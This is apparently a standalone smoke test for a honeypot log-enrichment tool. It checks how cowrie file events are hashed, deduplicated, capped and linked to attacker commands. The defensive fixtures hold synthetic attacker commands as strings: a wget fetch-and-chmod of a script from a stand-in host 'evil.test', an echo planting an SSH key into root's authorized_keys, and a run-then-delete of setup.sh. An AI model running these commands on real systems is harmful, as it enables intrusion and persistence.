"""Smoke test for ROADMAP #3 — cowrie file-event hashes as first-class artifacts.

Exercises `_build_session_doc`'s file-event handling end-to-end with synthetic
events shaped like the post-ingest raw docs (hash structured at
`file.hash.sha256`; download name at `cowrie.destfile`, upload name at
`cowrie.filename`; url at `url.original`). Asserts:
  - file_events[] records {action, sha256, filename?, url?, ts}
  - hashes promoted into artifact_set as `hash:<sha256>`
  - session-level threat.indicator file entries (deduped)
  - hashless file events (failed downloads) skipped
  - per-session cap enforced

Standalone — no ES/LLM.

Run from the repo root via the console venv:
    /home/styx/git/dshield_prism/console/.venv/bin/python \\
      scripts/smoke_test_file_events.py
"""
from __future__ import annotations

import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[1] / "src"))

from enrich.sources.cowrie.commands import hash_command, normalize
from enrich.sources.cowrie.sessions import (
    _MAX_FILE_EVENTS_PER_SESSION,
    _build_session_doc,
)


def cmd_event(command_line, ts):
    return {"@timestamp": ts, "event": {"action": "cowrie.command.input"},
            "process": {"command_line": command_line}}


def expected_hash(command_line):
    norm, _ = normalize(command_line, 4000)
    return hash_command(norm)


PASSED: list[str] = []
FAILED: list[tuple[str, str]] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    if cond:
        PASSED.append(name)
        print(f"  PASS  {name}")
    else:
        FAILED.append((name, detail))
        print(f"  FAIL  {name}  ({detail})")


class _Cfg:
    class _Worker:
        command_max_chars = 4000
    class _Session:
        embed_version = "v1"
    worker = _Worker()
    session = _Session()


cfg = _Cfg()
H1 = "a" * 64
H2 = "b" * 64


def download(sha, dest=None, url=None, ts="2026-05-28T00:00:01Z"):
    ev: dict = {"@timestamp": ts, "event": {"action": "cowrie.session.file_download"}}
    if sha is not None:
        ev["file"] = {"hash": {"sha256": sha}}
    if dest:
        ev["cowrie"] = {"destfile": dest}
    if url:
        ev["url"] = {"original": url}
    return ev


def upload(sha, name=None, ts="2026-05-28T00:00:02Z"):
    ev: dict = {"@timestamp": ts, "event": {"action": "cowrie.session.file_upload"}}
    if sha is not None:
        ev["file"] = {"hash": {"sha256": sha}}
    if name:
        ev["cowrie"] = {"filename": name}
    return ev


def sess(doc):
    return doc["dshield"]["cowrie"]["enrichment"]["session"]


# -----------------------------------------------------------------------------
print("[1] download + upload → file_events, artifact_set, threat.indicator")
events = [
    {"@timestamp": "2026-05-28T00:00:00Z", "event": {"action": "cowrie.session.connect"}, "source": {"ip": "1.2.3.4"}},
    download(H1, dest="/root/.ssh/authorized_keys", url="http://evil.test/x"),
    upload(H2, name="sshd"),
]
doc = _build_session_doc("s1", events, {}, cfg)
s = sess(doc)
fe = s.get("file_events") or []
check("two file_events recorded", len(fe) == 2, str(fe))
dl = next((e for e in fe if e["action"] == "download"), {})
ul = next((e for e in fe if e["action"] == "upload"), {})
check("download record fields", dl.get("sha256") == H1 and dl.get("filename") == "/root/.ssh/authorized_keys" and dl.get("url") == "http://evil.test/x" and dl.get("ts"), str(dl))
check("upload record fields", ul.get("sha256") == H2 and ul.get("filename") == "sshd", str(ul))
arts = set(s.get("artifact_set") or [])
check("both hashes promoted to artifact_set", f"hash:{H1}" in arts and f"hash:{H2}" in arts, str(arts))
inds = doc.get("threat", {}).get("indicator") or []
shas = {(i.get("file") or {}).get("hash", {}).get("sha256") for i in inds}
check("threat.indicator carries both file hashes", shas == {H1, H2}, str(inds))
check("indicator type is file", all(i.get("type") == "file" for i in inds), str(inds))
check("counts still bumped", s["file_download_count"] == 1 and s["file_upload_count"] == 1)

# -----------------------------------------------------------------------------
print("\n[2] hashless file event (failed download) is skipped")
events = [download(None, dest="/tmp/x"), download(H1, dest="/tmp/y")]
doc = _build_session_doc("s2", events, {}, cfg)
s = sess(doc)
check("only the hashed event recorded", [e["sha256"] for e in s.get("file_events", [])] == [H1], str(s.get("file_events")))
check("hashless download still counts", s["file_download_count"] == 2)

# -----------------------------------------------------------------------------
print("\n[3] duplicate hash → one indicator, deduped")
events = [download(H1, dest="/a"), download(H1, dest="/b")]
doc = _build_session_doc("s3", events, {}, cfg)
inds = doc.get("threat", {}).get("indicator") or []
check("two file_events but one deduped indicator", len(sess(doc)["file_events"]) == 2 and len(inds) == 1, str(inds))
check("dedup keeps first filename", (inds[0]["file"].get("name")) == "/a", str(inds))

# -----------------------------------------------------------------------------
print("\n[4] per-session cap enforced")
events = [download(f"{i:064x}", dest=f"/f{i}") for i in range(_MAX_FILE_EVENTS_PER_SESSION + 20)]
doc = _build_session_doc("s4", events, {}, cfg)
check("file_events capped", len(sess(doc)["file_events"]) == _MAX_FILE_EVENTS_PER_SESSION, str(len(sess(doc)["file_events"])))

# -----------------------------------------------------------------------------
print("\n[5] no file events → no file_events / threat keys")
events = [{"@timestamp": "2026-05-28T00:00:00Z", "event": {"action": "cowrie.session.connect"}}]
doc = _build_session_doc("s5", events, {}, cfg)
check("no file_events key", "file_events" not in sess(doc))
check("no threat key", "threat" not in doc)

# -----------------------------------------------------------------------------
print("\n[6] file→command attribution (IP→Session→Command→File)")
WGET = "cd /tmp || cd /var/run; wget http://evil.test/1.sh; chmod +x 1.sh"
ECHO = 'echo "ssh-rsa AAAA..." > /root/.ssh/authorized_keys'
events = [
    cmd_event(WGET, "2026-05-28T00:00:01Z"),
    download(H1, url="http://evil.test/1.sh", ts="2026-05-28T00:00:02Z"),
    cmd_event(ECHO, "2026-05-28T00:00:03Z"),
    download(H2, dest="/root/.ssh/authorized_keys", ts="2026-05-28T00:00:04Z"),
]
doc = _build_session_doc("s6", events, {}, cfg)
fe = {e["sha256"]: e for e in sess(doc)["file_events"]}
check("url-fetch linked to wget command", fe[H1].get("command_hash") == expected_hash(WGET), str(fe[H1]))
check("url-fetch attribution = url_match", fe[H1].get("command_attribution") == "url_match", str(fe[H1]))
check("redir linked to echo command", fe[H2].get("command_hash") == expected_hash(ECHO), str(fe[H2]))
check("redir attribution = destfile_match", fe[H2].get("command_attribution") == "destfile_match", str(fe[H2]))

print("\n[7] preceding-command fallback + no-command upload")
# download whose url/destfile don't appear in the prior command -> preceding_command
events = [cmd_event("uname -a", "2026-05-28T00:00:01Z"),
          download(H1, dest="/tmp/x", ts="2026-05-28T00:00:02Z")]
fe = sess(_build_session_doc("s7", events, {}, cfg))["file_events"][0]
check("fallback attribution = preceding_command", fe.get("command_attribution") == "preceding_command" and fe.get("command_hash") == expected_hash("uname -a"), str(fe))
# upload with no preceding command -> no link
fe = sess(_build_session_doc("s8", [upload(H2, name="sshd")], {}, cfg))["file_events"][0]
check("no preceding command -> no command_hash", "command_hash" not in fe and "command_attribution" not in fe, str(fe))

# -----------------------------------------------------------------------------
print("\n[8] filename_match fallback for SFTP uploads (run by a later command)")
RUN = "chmod +x setup.sh; sh setup.sh; rm -rf setup.sh"
events = [upload(H1, name="setup.sh", ts="2026-05-28T00:00:01Z"),
          cmd_event(RUN, "2026-05-28T00:00:02Z")]
fe = sess(_build_session_doc("s9", events, {}, cfg))["file_events"][0]
check("upload linked to later command via filename", fe.get("command_hash") == expected_hash(RUN), str(fe))
check("attribution = filename_match", fe.get("command_attribution") == "filename_match", str(fe))

print("\n[9] guards: short/common name rejected; substring not matched")
# 'sshd' (len 4, no extension) must NOT link even though a command mentions it
events = [upload(H2, name="sshd", ts="2026-05-28T00:00:01Z"),
          cmd_event("service sshd restart", "2026-05-28T00:00:02Z")]
fe = sess(_build_session_doc("s10", events, {}, cfg))["file_events"][0]
check("short non-extension name 'sshd' not linked (guard)", "command_hash" not in fe, str(fe))
# specific name as a substring (not whole token) must NOT match
events = [upload(H1, name="evil.sh", ts="2026-05-28T00:00:01Z"),
          cmd_event("cat /tmp/myevil.shadow", "2026-05-28T00:00:02Z")]
fe = sess(_build_session_doc("s11", events, {}, cfg))["file_events"][0]
check("substring (myevil.shadow) does not match evil.sh", "command_hash" not in fe, str(fe))
# but a whole-token reference does match
events = [upload(H1, name="evil.sh", ts="2026-05-28T00:00:01Z"),
          cmd_event("rm -f /tmp/evil.sh", "2026-05-28T00:00:02Z")]
fe = sess(_build_session_doc("s12", events, {}, cfg))["file_events"][0]
check("whole-token /tmp/evil.sh matches", fe.get("command_attribution") == "filename_match", str(fe))

# -----------------------------------------------------------------------------
print()
print(f"PASSED: {len(PASSED)}   FAILED: {len(FAILED)}")
if FAILED:
    for name, detail in FAILED:
        print(f"  - {name}: {detail}")
    sys.exit(1)
sys.exit(0)
